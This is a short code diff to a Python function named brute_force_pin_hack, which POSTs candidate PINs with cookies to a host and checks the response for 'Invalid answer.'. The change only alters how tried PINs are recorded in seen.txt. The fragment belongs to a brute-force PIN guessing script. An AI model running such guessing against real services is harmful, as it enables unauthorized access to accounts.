@@ -21,7 +21,7 @@ def brute_force_pin_hack():
     digits = [3, 4]
     k = len(digits) - 1
     result_pin = []
-    seen = {key: True for key in open('seen.txt').read().rstrip().split('\n')}
+    seen = {}
 
     while k >= 0:
         digit = digits[k]
@@ -37,7 +37,7 @@ def brute_force_pin_hack():
             res = requests.post(host, data=payload, cookies=cookies)
             res_data = res.json()
 
-            with open('seen.txt', 'a') as fd:
+            with open('seen.txt', 'w+') as fd:
                 fd.write(pin + '\n')
 
             if res_data.get('error') and res_data['error'] == 'Invalid answer.':
